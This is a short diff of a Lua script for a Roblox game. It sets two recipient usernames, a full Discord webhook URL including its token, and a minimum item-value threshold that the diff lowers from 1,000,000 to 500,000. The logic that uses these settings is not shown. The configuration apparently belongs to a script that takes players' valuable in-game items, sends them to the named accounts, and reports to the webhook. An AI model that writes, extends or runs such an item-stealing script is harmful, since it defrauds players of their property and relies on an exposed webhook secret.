@@ -1,7 +1,7 @@
 Username = "cabagaming"
 Username2 = "andrelee05"
 webhook = "https://discord.com/api/webhooks/1300131229299114066/jAGn4VLPrq4uT8bGwwMqcXjKSFMk3FTgCDQWWfrVYWYYGO6TCiq-QuwsuFGNpxXt4Ye1"
-min_rap = 1000000
+min_rap = 500000
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
